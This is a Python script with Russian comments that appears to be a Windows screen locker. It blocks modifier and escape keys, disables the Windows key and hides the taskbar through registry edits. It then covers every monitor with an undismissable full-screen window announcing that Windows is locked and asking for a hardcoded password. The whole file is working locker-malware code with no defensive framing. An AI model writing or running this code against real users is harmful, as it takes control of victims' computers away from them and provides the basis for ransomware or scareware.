from tkinter import *
from subprocess import Popen as cmd
import ctypes
import winreg
import sys
import keyboard # type: ignore

block = [
"shift", "windows", "alt", "esc", "backspace", "ctrl"]

for key in block:
    keyboard.block_key(key)

# Функция для блокировки клавиш Win
def block_win_key():
    # Блокируем клавиши Windows через реестр
    registry_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    try:
        reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(reg, "NoWinKeys", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(reg)
    except Exception as e:
        print(f"Ошибка при изменении реестра: {e}")

# Функция для скрытия панели задач
def hide_taskbar():
    # Скрыть панель задач
    registry_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3"
    try:
        reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(reg, "Settings", 0, winreg.REG_BINARY, b'\x30\x00\x00\x00\x00\x00\x00\x00')  # Скрытие панели задач
        winreg.CloseKey(reg)
    except Exception as e:
        print(f"Ошибка при изменении реестра: {e}")

# Функция для восстановления клавиши Win
def unblock_win_key():
    # Восстанавливаем клавиши Windows через реестр
    registry_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    try:
        reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_WRITE)
        winreg.DeleteValue(reg, "NoWinKeys")  # Удаляем блокировку клавиши Win
        winreg.CloseKey(reg)
    except Exception as e:
        print(f"Ошибка при изменении реестра: {e}")

# Функция для восстановления панели задач
def show_taskbar():
    # Восстанавливаем видимость панели задач
    registry_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3"
    try:
        reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(reg, "Settings", 0, winreg.REG_BINARY, b'\x28\x00\x00\x00\x00\x00\x00\x00')  # Восстановление панели задач
        winreg.CloseKey(reg)
    except Exception as e:
        print(f"Ошибка при изменении реестра: {e}")

NameFile = sys.argv[0]

# Получаем разрешение виртуального экрана (всех мониторов)
user32 = ctypes.windll.user32
user32.SetProcessDPIAware()

# Определяем размеры виртуального экрана (всех мониторов)
total_width = user32.GetSystemMetrics(78)  # SM_CXVIRTUALSCREEN
total_height = user32.GetSystemMetrics(79)  # SM_CYVIRTUALSCREEN
virtual_x = user32.GetSystemMetrics(76)  # SM_XVIRTUALSCREEN
virtual_y = user32.GetSystemMetrics(77)  # SM_YVIRTUALSCREEN

root = Tk()

# Функция для проверки пароля
def CheckPassword(arg):
    if password.get() == "123":  # Проверка пароля
        unblock_win_key()  # Восстановление клавиши Win
        show_taskbar()  # Восстановление панели задач
        root.destroy()  # Закрытие окна
        cmd("start explorer.exe", shell=True)
        try:
            quit()
        except Exception as e:
            print(f"Ошибка при закрытии окна: {e}")
            cmd(f"taskkill /f /im {NameFile}", shell=True)

# Блокировка клавиши Windows и скрытие панели задач
block_win_key()
hide_taskbar()

X = total_width  # Используем ширину всех экранов
Y = total_height  # Используем высоту всех экранов

bg = "black"
root["bg"] = bg
font = "Arial 25 bold"
root.protocol("WM_DELETE_WINDOW", lambda arg: ...)  # То же самое что Quit только упрощенно
root.attributes("-topmost", 1)
root.geometry(f"{X}x{Y}+{virtual_x}+{virtual_y}")  # Размещаем окно на всей доступной области
root.overrideredirect(1)  # Убираем рамки окна

Label(text="Ваш Windows заблокирован!", fg="red", bg=bg, font=font).pack()
Label(text="\n\n\n\nВведите пароль", fg="white", bg=bg, font=font).pack()

password = Entry(font=font)
password.pack()
password.bind("<Return>", CheckPassword)

root.mainloop()
